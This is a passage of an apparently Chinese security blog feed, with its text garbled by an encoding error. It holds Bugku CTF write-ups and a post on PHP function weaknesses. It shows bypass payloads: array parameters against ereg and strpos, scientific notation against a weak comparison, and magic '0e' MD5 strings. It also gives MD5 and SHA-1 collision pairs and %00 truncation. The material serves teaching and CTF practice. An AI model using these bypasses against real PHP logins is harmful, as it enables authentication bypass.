class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;ctf&#39;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;;</span><br><span class="line">else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">ereg()å‡½æ•°ä¼ å…¥æ•°ç»„ä¼šè¿”å›NULL,ä¸å¼ºç­‰äºFALSE,è¿›å…¥else if</span><br><span class="line"></span><br><span class="line">strpos()å‡½æ•°ä¼ å…¥æ•°ç»„ä¼šè¿”å›NULL,ä¸å¼ºä¸ç­‰äºFALSE,æ¡ä»¶æˆç«‹</span><br><span class="line"></span><br><span class="line">payload:?ctf[]&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;Bugku-D-M-S-J572&#125;</span><br><span class="line">æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</span><br><span class="line">é¢˜ç›®ä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password)) &#x2F;&#x2F;preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;flag&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c &#x3D; 0;</span><br><span class="line">$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">$c +&#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">&#x2F;&#x2F;&gt;&#x3D;3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span><br><span class="line">if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">else echo &#39;Wrong password&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»º</p><p>è¿™é‡Œçš„$_SERVER[â€˜REQUEST_METHODâ€™]æŒ‡çš„æ˜¯è¯·æ±‚æäº¤æ•°æ®çš„æ–¹å¼</p><p>å¯ä»¥çœ‹åˆ°éœ€è¦POSTä¸€ä¸ªå‚æ•°ä¸ºpasswordçš„å˜é‡</p><p>ä¸‹é¢æ˜¯ä»£ç ä¸­çš„ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•</p><pre><code>[:alpha:]åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å¤§å†™å’Œå°å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[0-9]&#123;3&#125;[[:alpha:]]&#123;2&#125;&#39; åŒ¹é…ä¸‰ä¸ªæ•°å­—ï¼Œåè·Ÿä¸¤ä¸ªå­—æ¯ã€‚[:alnum:]    åŒ¹é…å½“å‰å½’ç±»ä¸­çš„æ•°å­—ã€å¤§å†™å’Œå°å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:alnum:]]+&#39; åŒ¹é…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯å’Œæ•°å­—çš„å­—ç¬¦ä¸²ã€‚[:digit:]    åŒ¹é…å½“å‰å½’ç±»ä¸­çš„æ•°å­—ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:digit:]-]+&#39; åŒ¹é…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—æˆ–æ¨ªçº¿çš„å­—ç¬¦ä¸²ã€‚åŒæ ·ï¼Œ&#39;[^[:digit:]-]+&#39; åŒ¹é…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªä¸æ˜¯æ•°å­—æˆ–æ¨ªçº¿çš„å­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚[:lower:]    åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å°å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:lower:]]&#39; ä¸åŒ¹é… Aï¼Œå› ä¸º A ä¸ºå¤§å†™ã€‚[:space:]    åŒ¹é…å•ä¸ªç©ºæ ¼ (&#39; &#39;ï¼‰[:upper:]    åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å¤§å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:upper:]ab]&#39; ä¸ä»¥ä¸‹å…¶ä¸­ä¸€é¡¹åŒ¹é…ï¼šä»»ä½•å¤§å†™å­—æ¯ã€a æˆ– bã€‚[:whitespace:]    åŒ¹é…ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ï¼Œç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦å’Œå›è½¦ç¬¦ã€‚[:ascii:]    åŒ¹é…ä»»ä½•ä¸ƒä½çš„ ASCII å­—ç¬¦ï¼ˆ0 åˆ° 127 ä¹‹é—´çš„é¡ºåºå€¼ï¼‰ã€‚[:blank:]    åŒ¹é…ä¸€ä¸ªç©ºç™½åŒºæˆ–æ°´å¹³åˆ¶è¡¨ç¬¦ã€‚[[:blank:]] ç­‰æ•ˆäº [ \t]ã€‚[:cntrl:]    åŒ¹é…é¡ºåºå€¼å°äº 32 æˆ–å­—ç¬¦å€¼ä¸º 127 çš„ ASCII å­—ç¬¦ï¼ˆæ§åˆ¶å­—ç¬¦ï¼‰ã€‚æ§åˆ¶å­—ç¬¦åŒ…æ‹¬æ¢è¡Œç¬¦ã€æ¢é¡µç¬¦ã€é€€æ ¼ç¬¦ï¼Œç­‰ç­‰ã€‚[:graph:]    åŒ¹é…æ‰“å°å­—ç¬¦ã€‚[[:graph:]] ç­‰æ•ˆäº [[:alnum:][:punct:]]ã€‚[:print:]    åŒ¹é…æ‰“å°å­—ç¬¦å’Œç©ºæ ¼ã€‚[[:print:]] ç­‰æ•ˆäº [[:graph:][:whitespace:]]ã€‚[:punct:]    åŒ¹é…å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ï¼š !&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~.[:punct:] å­å­—ç¬¦ç±»ä¸èƒ½åŒ…æ‹¬å½“å‰å½’ç±»ä¸­å¯ç”¨çš„é ASCII æ ‡ç‚¹å­—ç¬¦ã€‚[:word:]    åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿å­—ç¬¦ã€‚[[:word:]] ç­‰æ•ˆäº [[:alnum:]_]ã€‚[:xdigit:]    åŒ¹é…å­—ç¬¦ç±» [0-9A-Fa-f] ä¸­çš„å­—ç¬¦ã€‚</code></pre><p>preg_match() å‡½æ•°è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯ 0 æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ– 1 æ¬¡ï¼Œå› ä¸º preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢</p><pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code></pre><p>$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå­—ç¬¦ä¸²å½¢å¼</p><p>$subject: è¾“å…¥å­—ç¬¦ä¸²</p><p>åˆ†æä»£ç å¯çŸ¥ï¼Œä¼ å…¥å‚æ•°å¿…é¡»ä½¿ç”¨POSTæ–¹æ³•ï¼Œè¿™é¢˜å¥½åƒå‡ºé”™äº†ï¼Œåªè¦POST<br>ä¸€ä¸ªæ•°æ®å°±å¯ä»¥å¾—åˆ°flag</p><p><strong>æ­£ç¡®çš„è§£é¢˜æ–¹æ³•åº”è¯¥æ˜¯ï¼š</strong></p><p>ç”±è¦è®©<code>0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)</code>ä¸ºFALSEå¯çŸ¥passwordçš„é•¿åº¦åº”è¯¥åœ¨12ä¸ªå­—ç¬¦åŠä»¥ä¸Š(éç©ºæ ¼éTABä¹‹å¤–çš„å†…å®¹)</p><p>ç”±</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;; </span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br></pre></td></tr></table></figure><p>å¯çŸ¥ï¼ŒåŒ¹é…åˆ°çš„æ¬¡æ•°è¦å¤§äº6æ¬¡ï¼ˆä»»æ„å­—ç¬¦æˆ–å¤§å°å†™å­—æ¯æˆ–æ•°å­—ï¼‰</p><p>ç”±</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­—  [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯  [[:lower:]] ä»»ä½•å°å†™å­—æ¯ </span><br><span class="line">foreach ($ps as $pt) </span><br><span class="line">&#123; </span><br><span class="line">    if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password)) </span><br><span class="line">        $c +&#x3D; 1; </span><br><span class="line">&#125; </span><br><span class="line">if ($c &lt; 3) break; </span><br></pre></td></tr></table></figure><p>å¯çŸ¥ï¼Œå¿…é¡»è¦æœ‰å¤§å°å†™å­—æ¯ï¼Œæ•°å­—ï¼Œå­—ç¬¦å†…å®¹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag; </span><br></pre></td></tr></table></figure><p>å¿…é¡»å¼±ç­‰äº42</p><pre><code>payloadï¼šPOSTè¿‡å»password=42.0000e%2b000000000password=420.000000000000e-1%2bä¸º+å·çš„urlç¼–ç ï¼Œ-å·çš„urlç¼–ç ä¸º-</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</p><p>å‡ºç°<code>flag&#123;test&#125;</code>æ‰æ„å‘³ç€å¾—åˆ°çœŸæ­£çš„flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> bugku </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¸€äº›å¸¸è§å‡½æ•°æ¼æ´</title>
      <link href="2019/09/25/php-function-leak/"/>
      <url>2019/09/25/php-function-leak/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†phpçš„ä¸€äº›å¸¸è§å‡½æ•°çš„æ¼æ´ï¼</p><a id="more"></a><h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><h3 id="md5å¼±æ¯”è¾ƒ"><a href="#md5å¼±æ¯”è¾ƒ" class="headerlink" title="md5å¼±æ¯”è¾ƒ"></a>md5å¼±æ¯”è¾ƒ</h3><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œé€šè¿‡è¾“å…¥ä¸€ä¸ªç»è¿‡å“ˆå¸Œåä»¥â€0Eâ€å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå³ä¼šè¢«PHPè§£é‡Šä¸º0ï¼Œå¦‚æœæ•°æ®åº“ä¸­å­˜åœ¨è¿™ç§å“ˆå¸Œå€¼ä»¥â€0Eâ€å¼€å¤´çš„å¯†ç çš„è¯ï¼Œä»–å°±å¯ä»¥ä»¥è¿™ä¸ªç”¨æˆ·çš„èº«ä»½ç™»å½•è¿›å»ï¼Œå°½ç®¡å¹¶æ²¡æœ‰çœŸæ­£çš„å¯†ç ã€‚</p><p><strong>ä½†å¹¶ä¸æ˜¯æ‰€æœ‰MD5å€¼0eå¼€å¤´çš„éƒ½å¼±ç›¸ç­‰ï¼Œåªæœ‰ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œå³åé¢æ˜¯çº¯æ•°å­—çš„</strong></p><pre><code>0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š2406107080e462097431906509019562988736854QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><p>è¿˜æœ‰MD5å’ŒåŒMD5ä»¥åçš„å€¼éƒ½æ˜¯<code>0e</code>å¼€å¤´çš„</p><ul><li><code>CbDLytmyGm2xQyaLNhWn</code></li><li><code>770hQgrBOjrcqftrlaZk</code></li><li><code>7r4lGXCH2Ksu2JNT3BYM</code></li></ul><h3 id="ä¸èƒ½å¤„ç†æ•°ç»„"><a href="#ä¸èƒ½å¤„ç†æ•°ç»„" class="headerlink" title="ä¸èƒ½å¤„ç†æ•°ç»„"></a>ä¸èƒ½å¤„ç†æ•°ç»„</h3><p>md5()å‡½æ•°å’Œsha1()å‡½æ•°ä¸€æ ·ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›å·²è®¡ç®—çš„å“ˆå¸Œæ•£åˆ—ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›NULLï¼Œå¯¹äºä¸€äº›æ¯”è¾ƒå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•ç»•è¿‡</p><h3 id="md5ç¢°æ’"><a href="#md5ç¢°æ’" class="headerlink" title="md5ç¢°æ’"></a>md5ç¢°æ’</h3><p>ä¸¤ä¸ªMD5ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸²</p><pre><code>Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>sha1()å‡½æ•°ä¹Ÿæœ‰ç›¸ä¼¼çš„ç¢°æ’</p><pre><code>a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>æ³¨æ„æäº¤æ—¶ä½¿ç”¨bpæŠ“åŒ…ï¼Œä¸èƒ½ç›´æ¥æäº¤ï¼Œå¦åˆ™çš„è¯æµè§ˆå™¨è§£ç ï¼Œæ•°æ®ä¼šä¸å®Œæ•´ï¼Œå…¶å®å°±ç›¸å½“äºæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„hash</p><h2 id="strcmp-å‡½æ•°"><a href="#strcmp-å‡½æ•°" class="headerlink" title="strcmp()å‡½æ•°"></a>strcmp()å‡½æ•°</h2><p>strcmp() å‡½æ•°ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²</p><p>å‡è®¾æ¯”è¾ƒçš„ä¸¤å­—ç¬¦ä¸²ä¸ºstring1å’Œstring2ï¼Œå‡½æ•°çš„è¿”å›å€¼å°†æœ‰ä¸‹é¢ä¸‰ç§æƒ…å†µï¼š</p><pre><code>0 - å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰&lt;0 - å¦‚æœ string1 å°äº string20 - å¦‚æœ string1 å¤§äº string2</code></pre><p>å½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›æ˜¯NULL</p><h2 id="is-numeric-å‡½æ•°"><a href="#is-numeric-å‡½æ•°" class="headerlink" title="is_numeric()å‡½æ•°"></a>is_numeric()å‡½æ•°</h2><p>ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œæ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE,åŒ…æ‹¬æ•°ç»„</p><p>is_numeric()å‡½æ•°æ£€æµ‹çš„æ—¶å€™ä¼šè‡ªåŠ¨è¿‡æ»¤æ‰å‰é¢çš„ â€˜ â€˜, â€˜\tâ€™, â€˜\nâ€™, â€˜\râ€™, â€˜\vâ€™, â€˜\fâ€™ç­‰å­—ç¬¦ï¼Œä½†æ˜¯ä¸ä¼šè¿‡æ»¤ â€˜\0â€™ï¼Œå¦‚æœè¿™äº›å­—ç¬¦å‡ºç°åœ¨å­—ç¬¦ä¸²å°¾ï¼Œä¹Ÿä¸ä¼šè¿‡æ»¤ï¼Œè€Œæ˜¯è¿”å› falseã€‚</p><pre><code>var_dump(is_numeric(&quot;\01&quot;)); // falsevar_dump(is_numeric(&quot; 1&quot;)); // truevar_dump(is_numeric(&quot;\t1&quot;)); // truevar_dump(is_numeric(&quot;\n1&quot;)); // truevar_dump(is_numeric(&quot;\r1&quot;)); // truevar_dump(is_numeric(&quot;\v1&quot;)); // truevar_dump(is_numeric(&quot;\f1&quot;)); // truevar_dump(is_numeric(&quot;\f\f1&quot;)); // truevar_dump(is_numeric(&quot;1\f&quot;)); // false</code></pre><p>å¦‚æœæœ‰ä¸¤ä¸ªis_numericåˆ¤æ–­çš„æ—¶å€™ç”¨andè¿æ¥èµ·æ¥ï¼Œandåé¢çš„is_numbericåˆ¤æ–­å¯å¿½ç•¥</p><pre><code>is_numeric(&#39;1&#39;) and is_numeric(&#39;a&#39;)        //true</code></pre><h2 id="ereg-å‡½æ•°"><a href="#ereg-å‡½æ•°" class="headerlink" title="ereg()å‡½æ•°"></a>ereg()å‡½æ•°</h2><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚</p><p>å¦‚æœæ²¡æœ‰ä¼ é€’å…¥å¯é€‰å‚æ•° regs æˆ–è€…æ‰€åŒ¹é…çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º 0ï¼Œåˆ™æœ¬å‡½æ•°è¿”å› 1</p><pre><code>int ereg ( string $pattern , string $string [, array &amp;$regs ] ) </code></pre><p><strong>åˆ©ç”¨ï¼š</strong></p><p>eregå‡½æ•°å­˜åœ¨00æˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æã€‚</p><p>eregå‡½æ•°å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULL</p><h2 id="strpos-å‡½æ•°"><a href="#strpos-å‡½æ•°" class="headerlink" title="strpos()å‡½æ•°"></a>strpos()å‡½æ•°</h2><p>ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><pre><code>int strpos( string $haystack, mixed $needle[, int $offset = 0] )</code></pre><p>haystack åœ¨è¯¥å­—ç¬¦ä¸²ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚</p><p>needle å¦‚æœ needle ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå®ƒå°†è¢«è½¬æ¢ä¸ºæ•´å‹å¹¶è¢«è§†ä¸ºå­—ç¬¦çš„é¡ºåºå€¼ã€‚</p><p>offset å¦‚æœæä¾›äº†æ­¤å‚æ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²è¯¥å­—ç¬¦æ•°çš„èµ·å§‹ä½ç½®å¼€å§‹ç»Ÿè®¡ã€‚å¦‚æœæ˜¯è´Ÿæ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šå­—ç¬¦æ•°å¼€å§‹ã€‚</p><p>å¦‚æœæ²¡æ‰¾åˆ° needleï¼Œå°†è¿”å› FALSEã€‚</p><p><strong>åˆ©ç”¨</strong><br>å½“$haystackä¸ºæ•°ç»„æ—¶ï¼Œå‡½æ•°è¿”å›NULLï¼Œå½“$needleä¸ºæ•°ç»„æ—¶å‡½æ•°è¿”å›flase</p><h2 id="preg-match-å‡½æ•°"><a href="#preg-match-å‡½æ•°" class="headerlink" title="preg_match()å‡½æ•°"></a>preg_match()å‡½æ•°</h2><p>é™åˆ¶å¼€å¤´ç»“å°¾ï¼Œä¸æ˜¯å¤šè¡ŒåŒ¹é…ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$json = <span class="string">&quot;\nflag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^flag$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º123</span></span><br></pre></td></tr></table></figure><p>å¦å¤–è¿˜æœ‰æœ€å¤§æ¬¡æ•°æ­£åˆ™å›æº¯ç»•è¿‡</p><h2 id="intvalå‡½æ•°"><a href="#intvalå‡½æ•°" class="headerlink" 